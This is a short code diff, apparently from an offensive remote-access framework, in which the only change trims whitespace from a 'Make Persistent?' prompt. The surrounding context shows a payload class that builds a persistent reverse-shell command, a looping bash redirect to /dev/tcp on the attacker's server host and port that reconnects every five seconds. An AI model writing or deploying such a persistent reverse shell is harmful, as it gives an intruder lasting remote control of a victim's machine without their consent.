@@ -29,7 +29,7 @@ class payload:
 
 	def run(self,server):
 		while 1:
-			persistence = raw_input(h.info_question_raw("Make Persistent? (y/N): ")).lower()
+			persistence = raw_input(h.info_question_raw("Make Persistent? (y/N): ")).strip(" ").lower()
 			if persistence == "y":
 				shell_command = "while true; do $("+shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
 				break
